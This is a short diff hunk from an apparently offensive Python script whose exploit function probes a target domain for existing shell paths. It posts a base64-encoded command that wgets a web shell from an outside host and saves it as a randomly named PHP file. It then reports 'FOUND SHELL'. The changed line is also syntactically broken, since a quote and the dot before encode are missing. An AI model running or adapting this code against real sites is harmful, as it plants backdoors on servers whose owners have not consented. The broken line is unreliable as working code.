@@ -63,7 +63,7 @@ def exploit(domain):
             rq = s.get('http://' + domain + '/' +i, headers=uagent)
             if rq.status_code == 200:
                 waf = (''.join(random.choices(string.ascii_letters, k=5)))
-                data = {'cmd':base64.b64encode(f'echo "success upload shell" && wget https://ups.zerodayforum.workers.dev/0:/shell.txt -O {waf}.php'.encode())}
+                data = {'cmd':base64.b64encode(f'echo "success upload shell" && wget https://ups.zerodayforum.workers.dev/0:/shell.txt -O {waf}.php encode())}
                 ww = s.post('http://' + domain + '/' +i, headers=uagent, data=data).text
                 if 'Owner/Group' in rq.text:
                     print(f'[{cyan}+{reset}] http:// ' + domain + '/' + i + f' [ {hijau}FOUND SHELL{reset} ]')
